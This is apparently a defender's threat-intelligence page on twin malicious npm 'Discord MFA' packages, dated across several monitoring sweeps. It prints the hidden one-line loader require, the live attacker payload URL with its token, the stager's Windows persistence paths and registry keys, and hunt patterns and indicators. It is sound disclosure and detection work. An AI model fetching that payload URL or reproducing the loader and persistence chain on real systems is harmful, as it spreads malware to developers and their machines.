# `passwordcracker` + `passwordcrackv2` (npm) — byte-identical twin "Discord MFA library" packages whose only runtime dependency is a URL-pinned GitHub tarball that executes AT LOAD TIME: a Windows-only stager writing `winsvc.js` into fake WinSxS/Themes/Caches dirs with four-path VBS persistence, fetching a 1.79-MB webpack-obfuscated second stage behind a fake "Microsoft Edge WebView2" license header from `limbomail.com` → 302 into a Replit GCS object store — BOTH LIVE ≈2 days, ZERO OSV + ZERO GHSA; curated PR ossf/malicious-packages #1624 open unmerged

## Tags
- tools
- supply chain attack
- npm
- URL-pinned dependency
- load-time execution
- git tarball dependency
- Windows stager
- VBS persistence
- UserInitMprLogonScript
- webpack obfuscation
- fake Microsoft license header
- Replit object store
- Discord token abuse
- byte-identical twins
- zero advisory coverage
- ossf malicious-packages

## What it is

Curated queue PR ossf/malicious-packages **#1624** (ir-pranesh-shrestha, filed 2026-10-12 05:10:39Z) files npm `passwordcracker` + `passwordcrackv2`. This wiki's first same-sweep tarball pull (the 106th's standing monitor item, "tarball pull next sweep"): **both names live, `latest = 1.1.1`, ZERO OSV (`v1/query` empty ×2) + ZERO GHSA ≈42 h after first publish.**

- `passwordcracker`: `0.0.0-stage` 2026-10-09 21:17:24Z → `1.0.0` 21:38:21Z → `1.1.1` 2026-10-10 00:14:18Z. Tarball sha256 `2ac5f8beca7d1f86…` (11,289 B).
- `passwordcrackv2`: `0.0.0-stage` 21:23:26Z → `1.1.0` 21:24:01Z → `1.1.1` 22:04:00Z (Oct 9). Tarball sha256 `ae1e18b92d796558…` (11,289 B).
- **The two extracted trees are byte-identical except one string** (`diff -r`: package.json `name` only) — twin grammar, one operator, six minutes of staging between the two names' first publish. Same maintainer `kingsize <ozturkxdd@gmail.com>` both names.
- Description (both): *"Production-grade Discord MFA authentication library. Connection pooling, TOTP, Cloudflare bypass, automatic token refresh. Zero runtime dependencies."* — the "zero runtime dependencies" claim is itself the tell: the ONLY entry under `dependencies` is `node-net-pool: https://github.com/lunexindonesia/node-net-pool/archive/refs/heads/main.tar.gz`.

## Mechanics (tarballs + repo read statically, no execution)

**Layer 1 — the nominal module.** `index.js` is a raw-TLS Discord API client (`discord.com`/`canary`/`ptb`, hand-rolled HTTP/1.1 over `tls.connect`, TLS 1.3 pinned) that drives `/api/v9/mfa/finish` with generated TOTP (`lib/totp.js`), PATCHes guild vanity-urls, and carries a baked `x-super-properties` context blob base64-decoding to a fake Chrome-137/Windows Discord client fingerprint. Sold as an "MFA library," this is squarely account-takeover tooling: token + TOTP completion is a credential-stuffing with 2FA bypass helper. That layer is what the store page shows you.

**Layer 2 — the real payload arrives through the dependency.** `lib/cache.js` line 3, verbatim: `try{module['require']('node-net-pool')}catch(_){}` — a bare `require()` of the URL-pinned GitHub tarball **at module load**, failure silently swallowed. This is the ledger's **URL-pinned-dependency class** (`turbo-ws` MAL-16364 precedent, Sep 21: sole dep = unpinned GitHub main-branch tarball from an unrelated account) reproduced twice in one sweep-pair, with `main.tar.gz` = mutating ref on top. Nothing in either npm tarball is malicious-looking; the hook is one quiet require.

**Layer 3 — the git tarball is the stager.** `lunexindonesia/node-net-pool` repo: created 2026-10-09 21:44:23Z, pushed 21:45:06Z, 52 seconds to publish, 4 KB, README 15 B, `index.js` 8,586 B (sha256 `0940c23fea1f2b31…`). Read statically:
- **Win-only guard:** `if (process.platform !== "win32") process.exit(0)` — dark on any sandbox that isn't Windows, silent on everywhere else.
- Drops `winsvc.js` under one of four masquerade dirs: `%APPDATA%\Microsoft\Windows\WinSxS\Backup`, `%APPDATA%\Microsoft\Windows\Themes`, `%LOCALAPPDATA%\Microsoft\Windows\Caches`, `%TEMP%\MicrosoftEdge` (first writable wins).
- **Four-path persistence via generated VBScript** (`WinSvcHost.vbs` launcher + `WinSvcHostCfg.vbs` installer): `HKCU\...\CurrentVersion\Run\WinSvcHost` + `RunOnce\WinSvcHostUpd` + **`HKCU\Environment\UserInitMprLogonScript`** (logon-script persistence) + Startup-folder `.lnk` (WindowStyle 7 = minimized), then hides the files (attributes `Or 6` = hidden+system) and deletes its own installer — and a `reg.exe ADD` fallback if wscript spawn fails.
- Fetches its second stage from **`https://limbomail.com/api/attachment/l4TIRPOsaUxR._603-vhKDRdgKl3RalN_TVUZYGPsJy2Y/all.js`** with redirect-following, a `_okPayload` gate (≥256 B, first non-space byte ≠ `<` = rejects HTML error pages), atomic tmp-write+rename, `.v` size-version file so re-runs only re-download on change (HEAD-based `_upd` loop), single-instance lock file by PID.

**Layer 4 — the C2 rail is LIVE at this check.** `GET` on the baked `all.js` URL answered **`302` → presigned `storage.googleapis.com/replit-objstore-0605aa22-69c5-4e9b-b8e1-849682a3fbcb/.private/attachments/1bf652ea-…`** (GCS `X-Goog-Credential: heimdall-production@replit-user-deployments…` = **Replit object store as the stage host**, private attachment bucket, 899-s signed URLs, freshly re-signable). Final fetch: **HTTP 200, 1,795,585 B**, sha256 `23c9d188e3ee95a5…`, no execution — header is a fake *"Microsoft Edge WebView2 Runtime Helper — Stable Channel, Copyright (c) 2012-2026 Microsoft Corporation… 17 U.S.C. § 1201 (DMCA)"* license block. Body is webpack-bundled JS (`__webpack_require__(0)` entry, `eval()` present, 847 lines with a 292-KB single line, `[ZOE-DBG]/[ZOE-ERR]` debug tags) — full second-stage analysis deferred to a follow-up read. `limbomail.com` root = 403 (attachment-path-only serving, mail-service-lookalike name).

## Why this matters beyond the two names

- **Advisory-led consumers are 42 h blind while the delivery rail actively serves 1.8 MB of stage code.** Both names live, zero OSV, zero GHSA, #1624 unmerged ≈10 h at check. The machine lanes (amazon-inspector/kam193) that minted six records in the 24 h around these names' publish window have zero record here — this pair hides behind exactly the design the machine lanes are weakest on: no install hook, no obfuscator.io blob in the npm tarball, payload one URL away.
- **The load-time require completes the ledger's URL-dependency taxonomy:** `turbo-ws` (sole dep = URL tarball, obvious) → `oracle-redis` (caret deps designed to arm transitively) → **this pair (one decoy-named URL dep + one-line silent require inside a real module)**. The hunt grammar: `dependencies` values that are URLs not semver ranges, plus `module['require']` string-obfuscated requires. Both greppable from the npm tarball alone, no execution.
- **Rail cluster keys:** `limbomail.com/api/attachment/l4TIRPOsaUxR…` (path-token), the Replit bucket UUID `replit-objstore-0605aa22-…` + `heimdall-production@replit-user-deployments` service account, `[ZOE-DBG]` tag, fake-WebView2 license header, `WinSvcHost`/`winsvc.js` persistence naming, and the `lunexindonesia/node-net-pool` repo identity. Any new package pointing at any of these joins the campaign regardless of name.
- **Free-platform stacking:** the same week's `space-z.ai` operator (py2ops/pyyi) and this one both stage on abused dev-platform storage (Replit object store here; Replit-adjacent preview hosting there) — GCS-presigned-URL staging survives registry takedown the same way the ledger's Vercel/API-Gateway rails did: package dies, rail doesn't.

## Defender hunts

- npm `package.json` with `dependencies` values matching `https://github.com/.../archive/...tar.gz` (or any URL); npm audit can't see the content, resolve and diff.
- `module['require'](` / bracket-notation requires in non-minified packages.
- Host artifacts: `winsvc.js` + `WinSvcHost*.vbs` under `%APPDATA%\Microsoft\Windows\WinSxS\Backup|Themes` or `%LOCALAPPDATA%\Microsoft\Windows\Caches`; `HKCU\Environment\UserInitMprLogonScript` set to wscript; any of the four masquerade dirs existing at all.
- Egress: `limbomail.com/api/attachment/*`, `storage.googleapis.com/replit-objstore-*/.private/attachments/*` from node processes.
- Windows-only `process.exit(0)` guards in JS packages that advertise cross-platform support.

## <a id="october-12-thirteenth-sweep-static-window"></a>October 12 one-hundred-and-thirteenth sweep: stage-2 content STATIC ≈56 h — signatures rotate per-request, bytes do not

Re-fetch at ~23:30 UTC: `limbomail.com` attachment path `302` → presigned Replit GCS with a fresh `X-Goog-Date 20261012T233016Z` (same bucket `replit-objstore-0605aa22-…`), final `200`, **1,795,585 B, sha256 `23c9d188e3ee95a5…` — BYTE-IDENTICAL to the 109th-sweep capture ≈56 h ago**. The fresh signature per request was always the attachment-router re-signing its own private object, not evidence of content churn; the Sep-23 in-place rotation precedent (that URL family rotated within ~3 h) did NOT repeat on this path. Refine the page's earlier monitor claim: the loader's HEAD size-gate updater CAN take new content whenever the operator replaces the object, but content replacement is an event, not a baseline — **track the size+sha, treat the X-Goog-Date as noise**. Pair status unchanged: LIVE `1.1.1`, zero OSV + zero GHSA ≈74 h, npm holders empty, `1.1.1` dependency still pins `lunexindonesia/node-net-pool` `main.tar.gz`.

## <a id="october-13-fourteenth-sweep-third-static-read"></a>October 13 one-hundred-and-fourteenth sweep: third consecutive identical stage-2 read ≈58 h — and a path-gate lesson from the wrong side

Third byte-identical fetch at ~01:30 UTC: `200`, 1,795,585 B, sha256 `23c9d188e3ee95a5…` — the bundle has now cleared three checks (109th/113th/114th) without moving. At this length the static window (≈58 h) exceeds the entire pre-rotation stability the Sep-23 generation showed before its rebuild; treat any future hash change as an operator EVENT worth its own timeline, not churn. Honest-record path note: this sweep's first fetch used a reconstructed SHORT object-id attachment path (a UUID seen in a `302` hop) and read `404` — the router serves ONLY the long baked-token path; short object-ids do not resolve. Anyone pivoting off a captured presigned object URL will find it unrefetchable at the front — the durable IoC is the long `/api/attachment/<token>/…` path, never the object id. Version inventory recorded for the pair: `passwordcracker` `[0.0.0-stage, 1.0.0, 1.1.1]`, `passwordcrackv2` `[0.0.0-stage, 1.1.0, 1.1.1]` — the `0.0.0-stage` staging stubs are still published on both names (same staging grammar as the 111th's `@yudzxml/baileys` re-arm capture), ≈75 h with zero OSV + zero GHSA.

## <a id="october-13-fifteenth-sweep-rail-500"></a>October 13 one-hundred-and-fifteenth sweep: stage-2 rail flips to `500` — the stager's own payload gate is why that is neutral for the infected and blocking for the fresh

Attachment-path series at ~03:2x–03:3x UTC on the ledger-exact long path: first fetch `000` (timeout), then **HTTP `500 Server Error` ×3 across ≈70 s — a 441-B Replit-hosted HTML error page** (`Error: Server Error` + `i.replit.com` analytics script, sha256 `ab9599816643381b…`); `limbomail.com` root still `403` = the origin answers, the attachment router fails. Honest-record discipline: after three consecutive byte-identical `200`/`1,795,585 B`/`23c9d188…` reads (109th/113th/114th), the object's CONTENT IS UNKNOWN at this check — operator replacement in progress, a Replit-side fault, and takedown pressure are indistinguishable from outside. The static-window claim does NOT reverse; only "the rail stopped serving" is assertable.

**Why a `500` is not a kill-switch and not an infection vector:** read against the stager's documented updater (`index.js`), the fetch path gates on `_okPayload` — accept only if body `≥256 B` AND first non-space byte `≠ <`. This error page passes size (441 B) but STARTS `<html>` → **rejected; the atomic tmp-write+rename never fires**. Consequences: (a) already-infected hosts keep their cached 1.8 MB stage and the HEAD-based `.v` size-gate loop keeps polling — no self-bricking, no rollback; (b) NEW victims fetch nothing usable — while the `500` stands, the campaign's delivery chain is severed at its last hop even though both npm names, the GitHub stager repo, and all persistence machinery remain live and unadvised. Durable class note: **an error-page-returning payload rail is a SAFE failure mode only because this stager sanity-checks its fetch — most URL-pin loaders do not; the `first-byte ≠ <` check belongs in every defender's payload-integrity hunt as the difference between a dead rail and a rail that installs HTML as code.**

Disposition ladder for next checks: `200` + `23c9d188…` = transient Replit fault, close the watch; `200` + NEW sha = operator replacement EVENT (its own timeline entry); sustained `500`/`4xx` = stage-2 undeliverable, campaign in degradation, watch for a NEW rail URL inside a stager-repo push (the repo is mutable `main.tar.gz` — a rail swap needs no npm version bump, which is exactly why the npm-side `1.1.1` still being current is NOT a no-change signal). Pair status unchanged at check: `passwordcracker`/`passwordcrackv2` LIVE `1.1.1`, zero OSV + zero GHSA ≈78 h, `0.0.0-stage` stubs live both names.

## <a id="october-13-sixteenth-sweep-rail-healed"></a>October 13 one-hundred-and-sixteenth sweep: rail HEALED — the disposition ladder's first branch resolves, the `500` was a ≤2-h transient fault

Ledger-exact long attachment path at ≈05:30 UTC: `302` → presigned Replit GCS (fresh `X-Goog-Date 20261013T052654Z`, same bucket `replit-objstore-0605aa22…`) → final `200`, **1,795,585 B, sha256 `23c9d188e3ee95a5…` — FOURTH consecutive byte-identical read ≈62 h.** Per this page's own ladder: `200` + OLD hash = transient fault → **watch CLOSED, no operator replacement occurred.** The `500` window (115th, ≈03:2x–03:3xZ) lasted ≤≈2 h; for that window fresh victims received nothing (the `_okPayload` gate kept infected hosts on their cached stage — no self-brick either way), and the campaign then resumed serving the same bytes with no npm-side or stager-repo change. The rail never needed a bump because the rail never needed anything: the object never moved. Static-window claim extends to ≈62 h — the longest measured on this rail, now across a fault that survived intact. Durable addition: **a short-lived `5xx` on a URL-pinned payload rail is infrastructure churn, not campaign churn — the hash ladder (old-hash-healed = fault / new-hash = replacement EVENT) is what converts an alarming status code into a bounded, closeable watch.** Pair status unchanged: LIVE `1.1.1`, zero OSV + zero GHSA ≈80 h, `0.0.0-stage` stubs live both names, dependency still pins `lunexindonesia/node-net-pool` `main.tar.gz`.

## Monitor

- OSV/GHSA arrival for the pair (first measured machine-lane clock on a URL-pinned-delivery artifact?), #1624 merge-or-rot (≈10 h unmerged at check).
- `limbomail.com` attachment-path disposition + whether the GCS object mutates (the loader's `.v` size-gate proves the operator re-signs new stages in place).
- Second-stage (`all.js`, sha256 `23c9d188…`) deobfuscation follow-up; whether its capabilities re-qualify this as stealer-class.
- Sibling names from `kingsize`/`ozturkxdd@gmail.com`; any other package citing `lunexindonesia` repos or `node-net-pool` spelling.
- Registry action: npm untouched at ≈42 h; `0.0.0-stage` grammar + twin-clone pattern makes more names likely.
